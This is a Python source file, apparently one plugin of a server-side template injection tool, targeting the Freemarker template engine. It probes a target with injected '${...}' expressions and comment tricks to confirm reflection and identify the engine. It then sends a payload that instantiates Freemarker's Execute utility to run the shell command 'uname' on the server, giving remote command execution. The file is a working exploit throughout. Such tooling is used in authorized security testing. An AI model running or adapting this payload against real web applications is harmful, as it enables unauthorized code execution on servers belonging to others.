from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Freemarker(Check):
    
    def detect(self):
        
        # Declare payload
        self.base_tag = '${%s}'
        
        self.req_header_rand = str(rand.randint_n(4))
        self.req_trailer_rand = str(rand.randint_n(4))
        
        # Skip reflection check if same tag has been detected before
        if self.get('reflect_tag') != self.base_tag:
            self._check_reflection()
        
            # Return if reflect_tag is not set
            if not self.get('reflect_tag'):
                return
                
            log.warn('Reflection detected with tag \'%s\'' % self.get('reflect_tag'))

        self._check_engine()
            
        if not self.get('language') or  not self.get('engine'):
            return
            
        log.warn('Freemarker engine detected')

        self._check_os()
        
        if not self.get('exec'):
            return
            
        log.warn(
            'Shell command execution detected on \'%s\' operating system' % (
                self.get('os', 'undetected')
            )
        )

    def _check_reflection(self):
        
        randA = rand.randint_n(1)
        randB = rand.randint_n(1)

        payload = '${%i*%i}' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.set('reflect_tag', self.base_tag)
            
    def _check_os(self):
        
        payload = """<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("uname") }"""
        
        self.set('exec', True)
        self.set('os', self.req(payload))
               

    def _check_engine(self):
        
        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)
        
        payload = '%s<#--%s-->%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB
                
        if expected == self.req(payload):
            self.set('language', 'java')
            self.set('engine', 'freemarker')
            
    def req(self, payload):
    
        # Rewrite req to include Freemarker number formatting
        # 3333 -> 3,333
        
        req_header = self.base_tag % self.req_header_rand
        req_trailer = self.base_tag % self.req_trailer_rand
        
        req_header_rand_formatted = self.req_header_rand[:1] + ',' + self.req_header_rand[1:]
        req_trailer_rand_formatted = self.req_trailer_rand[:1] + ',' + self.req_trailer_rand[1:]

        response = self.channel.req(req_header + payload + req_trailer)
        before,_,result = response.partition(req_header_rand_formatted)
        result,_,after = result.partition(req_trailer_rand_formatted)
        
        return result.strip()